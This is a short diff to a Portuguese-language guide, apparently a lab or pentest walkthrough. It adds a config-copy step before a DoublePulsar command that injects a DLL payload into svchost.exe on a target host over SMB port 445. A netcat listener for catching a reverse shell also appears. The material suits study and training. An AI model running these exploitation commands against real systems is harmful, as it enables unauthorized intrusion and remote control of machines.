@@ -62,6 +62,9 @@ rlwrap nc -vnlp 8080
 
 Enviando shellcode para injetar DLL com DoublePulsar:
 ```
+cp Doublepulsar-1.3.1.Skeleton.xml Doublepulsar-1.3.1.xml
+```
+```
 wine Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp 172.16.1.145 --TargetPort 445 --DllPayload shell.dll --DllOrdinal 1 --ProcessName svchost.exe --ProcessCommandLine --Protocol SMB --Architecture x86 --Function Rundll
 ```
 - IP do servidor alvo: 172.16.1.145
